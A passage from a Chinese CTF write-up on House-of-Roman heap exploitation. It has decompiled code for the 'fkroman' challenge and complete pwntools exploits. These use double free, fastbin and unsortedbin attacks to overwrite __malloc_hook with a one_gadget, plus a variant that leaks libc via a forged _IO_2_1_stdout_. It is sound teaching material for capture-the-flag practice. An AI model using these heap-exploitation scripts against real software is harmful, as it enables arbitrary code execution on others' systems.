    add(3,0x68) # 3
    remove(1)
    edit(0,0x18,'a'*0x18+'\xe1')
    remove(1)
    add(3,0x18) # 3
    edit(3,0x1,p64(libc.sym['__malloc_hook']-0x23)[:2])
    edit(0,0x18,'a'*0x18+'\x71') # fix chunk size
    add(1,0x68)
    add(0,0x68) # __malloc_hook-0x13
    remove(1)
    edit(1,7,p64(0)) # fix fastbins
    add(3,0x68)
    add(3,0x48)
    edit(2,0x8+1,p64(0)+p64(libc.sym['__malloc_hook']-0x10)[:2])
    add(3,0x68) 
    #one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
    one_gadget = libc.address + 0xf02a4
    edit(0,0x13+2,'a'*0x13+p64(one_gadget)[:3])
    remove(3)
    remove(3)
    p.interactive()
### 云安全共测大赛 fkroman
    __int64 __fastcall main(__int64 a1, char **a2, char **a3)
    {
      signed int i; // [rsp+4h] [rbp-2Ch]
      int v5; // [rsp+8h] [rbp-28h]
      unsigned int v6; // [rsp+Ch] [rbp-24h]
      char s; // [rsp+10h] [rbp-20h]
      unsigned __int64 v8; // [rsp+28h] [rbp-8h]
      v8 = __readfsqword(0x28u);
      init_0();
      for ( i = 0; i  2 )
        {
          if ( v5 == 3 )
          {
            remove(v6);
            continue;
          }
          if ( v5 == 4 )
          {
            edit(v6);
            continue;
          }
        }
        else if ( v5 == 1 )
        {
          add(v6);
          continue;
        }
        puts("Invalid option!\n");
      }
      return 0LL;
    }
程序菜单：
    1.alloc
    2.show
    3.free
    4.edit
    5.exit
虽然菜单里面有show，然而是用不了的。跟上一题类似，有alloc，free，edit的功能，没有打印信息的函数。
漏洞一：free之后没有清空指针，存在double free。
    int __fastcall remove(unsigned int a1)
    {
      int result; // eax
      if ( a1  bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0xab7cebee20000000
    0x80: 0x0
    unsortedbin
    all: 0x56160694b020 —▸ 0x7fab7d1fdaed (_IO_wide_data_0+301) ◂— 0xab7cebee20000000
    smallbins
    empty
    largebins
    empty
继续对0号chunk进行堆溢出就可以修改unsortedbin的BK，注意需要把chunk size修复为0xe1。这里我没有使用double
free触发报错，直接调用malloc就成功getshell。
    edit(0,0x22+8,flat(0,0,0,0xe1,0)+p64(libc.sym['__malloc_hook']-0x10)[:2])
    alloc(6,0xd0) # unsorted bins
    one_gadget = libc.address + 0xf1147
    edit(5,0x16,'a'*0x13+p64(one_gadget)[:3])#5cf147 ba1147
    alloc(8,0x60)
完整EXP：
    def pwn():
        def alloc(idx,size):
            p.sendlineafter('choice: ','1')
            p.sendlineafter('Index: ',str(idx))
            p.sendlineafter('Size: ',str(size))
        def free(idx):
            p.sendlineafter('choice: ','3')
            p.sendlineafter('Index: ',str(idx))
        def edit(idx,size,content):
            p.sendlineafter('choice: ','4')
            p.sendlineafter('Index: ',str(idx))
            p.sendlineafter('Size: ',str(size))
            p.sendafter('Content: ',content)
        # house of roman
        libc.address = 0x233000
        alloc(0,0x10)
        alloc(1,0x60)
        alloc(2,0x60)
        alloc(3,0x60)
        free(1)
        edit(0,0x20,flat(0,0,0,0xe1))
        free(1)
        # fastbin attack
        edit(0,0x22,flat(0,0,0,0x71)+p64(libc.sym['__malloc_hook']-0x23)[:2])
        alloc(4,0x60)
        alloc(5,0x60) # __malloc_hook
        # unsortedbin attack
        edit(0,0x22+8,flat(0,0,0,0xe1,0)+p64(libc.sym['__malloc_hook']-0x10)[:2])
        alloc(6,0xd0) # unsorted bins
        #one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
        one_gadget = libc.address + 0xf1147
        edit(5,0x16,'a'*0x13+p64(one_gadget)[:3])#5cf147 ba1147
        alloc(8,0x60)
        p.interactive()
这题比护网杯的简单，不过核心的思路仍然是fastbin attack和unsortedbin attack。
## 更多思考
重新打开ASLR进行测试exp时，脸黑的兄弟会发现跑了很久很久都不成功，因为House-Of-Roman成功率实在有点感人，虽然大幅度降低了爆破的范围，仍然需要爆破12bit，也就是1/4096的成功率。今年各大比赛见过不少没有打印功能的题目，却鲜有人提及House-Of-Roman，为何？
原因很简单，因为有更好更稳定的攻击手段，就是修改`IO_FILE`结构体进行地址泄漏。以第二题fkroman为例，在第一步进行fastbin
attack时，将fd修改至stdout附近，然后修改stdout结构体，即可泄漏libc地址，后面修改`__malloc_hook`就无需进行低地址写爆破，将成功率提高到1/16，非洲人福音。
`_IO_2_1_stdout_`泄露地址的方法看其他大佬的文章，这里不展开说了，可以参考：
fkroman的exp可修改为：
    def pwn():
        def alloc(idx,size):
            p.sendlineafter('choice: ','1')
            p.sendlineafter('Index: ',str(idx))
            p.sendlineafter('Size: ',str(size))
        def free(idx):
            p.sendlineafter('choice: ','3')
            p.sendlineafter('Index: ',str(idx))
        def edit(idx,size,content):
            p.sendlineafter('choice: ','4')
            p.sendlineafter('Index: ',str(idx))
            p.sendlineafter('Size: ',str(size))
            p.sendafter('Content: ',content)
        global p
        alloc(0,0x10)
        alloc(1,0x60)
        alloc(2,0x60)
        alloc(3,0x60)
        free(1)
        edit(0,0x20,flat(0,0,0,0xe1)) 
        free(1)
        edit(0,0x22,flat(0,0,0,0x71)+p16(0x65dd))
        alloc(4,0x60)
        alloc(5,0x60)
        edit(5,0x54,'a'*0x33+p64(0xfbad2887|0x1000)+p64(0)*3+'\x00') 
        libc.address = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - libc.sym['_IO_2_1_stderr_'] - 192
        success(hex(libc.address))
        free(2)
        edit(2,0x8,p64(libc.sym['__malloc_hook']-0x23))
        alloc(6,0x60)
        alloc(7,0x60)
        edit(7,0x1b,'a'*0x13+p64(libc.address+0xf1147))
        alloc(8,0x60)
        p.interactive()
用这个exp的成功率大大提升，各位非洲人可以试试。
## 总结
House-Of-Roman的攻击思路很值得学习，不过改修改`IO_FILE`结构体的方法成功率更高，本地测试基本秒出，正常情况下还是优先考虑用此方法。
## 参考